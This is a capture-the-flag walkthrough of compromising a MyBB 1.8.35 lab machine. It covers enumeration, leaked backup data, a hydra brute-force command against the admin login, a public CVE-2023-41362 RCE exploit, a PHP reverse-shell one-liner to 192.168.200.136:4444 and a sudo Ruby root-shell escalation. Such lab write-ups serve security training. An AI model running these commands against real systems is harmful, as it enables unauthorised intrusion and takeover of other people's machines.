# ENUMERATION


## OPEN PORTS


![Pasted image 20241029135137.png](../../IMAGES/Pasted%20image%2020241029135137.png)
Seems like we only have a website, let's fuzz it


## FUZZING

### GOBUSTER FUZZ

![Pasted image 20241029135218.png](../../IMAGES/Pasted%20image%2020241029135218.png)

### SOURCE CODE AND WEBPAGE

Nothing useful, let's see the page:

![Pasted image 20241029143334.png](../../IMAGES/Pasted%20image%2020241029143334.png)

Let's go to the forum:

![Pasted image 20241029143346.png](../../IMAGES/Pasted%20image%2020241029143346.png)

We need to add `panel.mybb.dl` to `/etc/hosts` in order to be able to go into the website:

![Pasted image 20241029143517.png](../../IMAGES/Pasted%20image%2020241029143517.png)

![Pasted image 20241029143536.png](../../IMAGES/Pasted%20image%2020241029143536.png)
Nice, let's keep enumerating the machine until we find something we can exploit:

![Pasted image 20241029143732.png](../../IMAGES/Pasted%20image%2020241029143732.png)
We can see we only have the admin user registered, 


![Pasted image 20241029143829.png](../../IMAGES/Pasted%20image%2020241029143829.png)
Let's fuzz the `http://panel.mybb.dl` website to check if we can find anything:

![Pasted image 20241029144434.png](../../IMAGES/Pasted%20image%2020241029144434.png)

We found interesting things, directory I like the most is the `/backups` directory, let's fuzz it to check if there's anything in there:

![Pasted image 20241029144701.png](../../IMAGES/Pasted%20image%2020241029144701.png)

Found `/data` inside of the directory, let's take a look:

![Pasted image 20241029144821.png](../../IMAGES/Pasted%20image%2020241029144821.png)

In general, SQL queries can be found, and some login attempts, but the most interesting part is the following:

![Pasted image 20241029144856.png](../../IMAGES/Pasted%20image%2020241029144856.png)

User `alice` attempted to log in using a password, that seems like a hash, let's try to crack it and log into Alice account

![Pasted image 20241029145105.png](../../IMAGES/Pasted%20image%2020241029145105.png)

We got `alice:tinkerbell` let's attempt to log in:

![Pasted image 20241029145142.png](../../IMAGES/Pasted%20image%2020241029145142.png)
We cannot get in using those credentials, seems like they were fake, so, why don't we try some bruteforce using the `admin` username, let's capture the request with `burp` and use `hydra` to brute force our login page:


```request
POST /admin/index.php HTTP/1.1

Host: panel.mybb.dl

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 38

Origin: null

Connection: keep-alive

Cookie: mybb[lastvisit]=1730230425; mybb[lastactive]=1730230863; sid=df2321f0ff06ec973eb0f4cbfc38c6de

Upgrade-Insecure-Requests: 1

Priority: u=0, i



username=admin&password=admin&do=login
```

So, we got a post request, let's brute force:

```ad-hint

##### HYDRA COMMAND

`hydra -l admin -P /usr/share/wordlists/rockyou.txt panel.mybb.dl http-post-form "/admin/index.php:username=^USER^&password=^PASS^&do=login:F=Login Failed"`




```

So, we got plenty amount of passwords, after trying every single one of them, correct credentials were: `admin`:`babygirl`, let's log in and proceed with exploitation:

![Pasted image 20241029150737.png](../../IMAGES/Pasted%20image%2020241029150737.png)



# EXPLOITATION


First, we can see we are running `myBB 1.8.35` let's search for any exploit in this version:

![Pasted image 20241029150932.png](../../IMAGES/Pasted%20image%2020241029150932.png)
We found this [exploit](https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE), let's download it and use it:

![Pasted image 20241029151057.png](../../IMAGES/Pasted%20image%2020241029151057.png)
So, we need to put this:

```ad-hint

# PYTHON COMMAND:

python3 exploit.py http://panel.mybb.dl admin babygirl

##### OUTPUT


We got RCE!
```

With the RCE from the exploit, we can get a [reverse shell](../../REVERSE%20SHELLS/MOST%20COMMON%20REVERSE%20SHELLS.md):

```ad-note

# USED SHELL

php: `php -r '$sock=fsockopen("192.168.200.136",4444);shell_exec("bash <&3 >&3 2>&3");'`

# CONNECTION RECEIVED


```

Let's [stabilize our shell](../../Commands/Shell%20Tricks/STABLE%20SHELL.md):

![Pasted image 20241029151553.png](../../IMAGES/Pasted%20image%2020241029151553.png)

With our new stable shell, we can begin with [PRIVESC](../../LINUX/LINUX%20PRIVILEGE%20ESCALATION/BASIC%20PRIVESC%20IN%20LINUX.md)

# PRIVILEGE ESCALATION



At home directory, we can find our previous user `alice`, let's switch users:

![Pasted image 20241029151851.png](../../IMAGES/Pasted%20image%2020241029151851.png)

Nice, we were able to switch to alice, let's use `sudo -l` to get root access:


## SUDO -L


![Pasted image 20241029151944.png](../../IMAGES/Pasted%20image%2020241029151944.png)
Pretty weird, let's take a look at that:

It is a ruby script, since we can execute any ruby script as root without the need of a password, we can do the following:

```ad-hint

`echo 'exec "/bin/bash"' > /home/alice/scripts/root.rb`
`chmod +x root.rb`

`sudo /home/alice/scripts/root.rb`

# OUTPUT



```

And just like that, the CTF is done!
